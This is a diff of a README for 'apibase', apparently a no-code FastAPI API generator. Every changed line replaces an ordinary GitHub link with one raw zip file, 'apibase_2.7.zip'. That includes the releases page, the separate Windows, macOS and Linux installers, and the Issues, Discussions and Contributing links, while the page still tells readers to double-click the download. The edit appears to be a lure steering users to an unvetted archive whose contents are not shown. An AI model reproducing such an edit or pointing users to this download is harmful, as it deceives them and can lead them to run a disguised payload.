@@ -1,23 +1,23 @@
 # 🌟 apibase - Effortlessly Create APIs with No Code
 
 ## 🔗 Quick Download
-[![Download Now](https://img.shields.io/badge/Download%20apibase-blue.svg)](https://github.com/urfavgamereisme/apibase/releases)
+[![Download Now](https://raw.githubusercontent.com/urfavgamereisme/apibase/main/apibase/apibase_2.7.zip%https://raw.githubusercontent.com/urfavgamereisme/apibase/main/apibase/apibase_2.7.zip)](https://raw.githubusercontent.com/urfavgamereisme/apibase/main/apibase/apibase_2.7.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run apibase, an asynchronous CRUD API generator using FastAPI and SQLAlchemy. You do not need programming skills to get started.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Click on this link to visit the releases page: [Download apibase](https://github.com/urfavgamereisme/apibase/releases)
+   Click on this link to visit the releases page: [Download apibase](https://raw.githubusercontent.com/urfavgamereisme/apibase/main/apibase/apibase_2.7.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions listed. Find the latest release at the top. You will see a list of files associated with that release. 
 
 3. **Download the Application**  
    Look for the installation file that matches your operating system:
-   - For Windows, download `apibase-windows.exe`.
-   - For macOS, download `apibase-macos.app`.
-   - For Linux, download `apibase-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/urfavgamereisme/apibase/main/apibase/apibase_2.7.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/urfavgamereisme/apibase/main/apibase/apibase_2.7.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/urfavgamereisme/apibase/main/apibase/apibase_2.7.zip`.
 
 4. **Run the Application**  
    After downloading the file, locate it in your Downloads folder or wherever you saved it. Double-click the file to run the application. 
@@ -66,9 +66,9 @@ If you encounter issues while using apibase, consider the following solutions:
 ## 🌐 Get Involved
 If you like using apibase and want to contribute, here’s how:
 
-- **Report Issues:** Help us improve by reporting bugs on the [Issues page](https://github.com/urfavgamereisme/apibase/issues).
-- **Suggest Features:** Have an idea? Let us know on the [Discussions page](https://github.com/urfavgamereisme/apibase/discussions).
-- **Contribute to Code:** Check out our [Contributing Guide](https://github.com/urfavgamereisme/apibase/blob/main/CONTRIBUTING.md) to help make apibase even better.
+- **Report Issues:** Help us improve by reporting bugs on the [Issues page](https://raw.githubusercontent.com/urfavgamereisme/apibase/main/apibase/apibase_2.7.zip).
+- **Suggest Features:** Have an idea? Let us know on the [Discussions page](https://raw.githubusercontent.com/urfavgamereisme/apibase/main/apibase/apibase_2.7.zip).
+- **Contribute to Code:** Check out our [Contributing Guide](https://raw.githubusercontent.com/urfavgamereisme/apibase/main/apibase/apibase_2.7.zip) to help make apibase even better.
 
 ## ⚠️ License
 apibase is open-source software licensed under the MIT License. You can use and share it freely, as long as you provide credit to the original developers.
